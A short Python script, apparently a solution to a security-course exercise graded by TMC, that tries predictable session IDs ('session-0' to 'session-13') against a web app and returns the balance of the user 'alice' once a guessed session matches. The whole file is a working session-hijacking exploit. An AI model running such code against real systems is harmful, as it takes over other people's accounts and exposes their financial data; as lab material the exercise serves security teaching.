import sys
import requests
import json


def test_session(address):
	# write your code here
    for i in range(14):
        sessionid = 'session-'+str(i)
        scamsession = requests.session()
        loginaddress = address +'/login/'
        x = scamsession.get(address,cookies={
            'sessionid' : sessionid})

        cookies = x.cookies
        token = cookies['csrftoken']
        print(sessionid,token)

        z = scamsession.get(address+'/balance',cookies={
            'sessionid' : sessionid})
            #'csrfmiddlewaretoken' : token})
        json = z.json()
        if json['username'] == 'alice':
            return json['balance']

    return None



def main(argv):
    address = sys.argv[1]
    print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
    if len(sys.argv) != 2:
        print('usage: python %s address' % sys.argv[0])
    else:
        main(sys.argv)
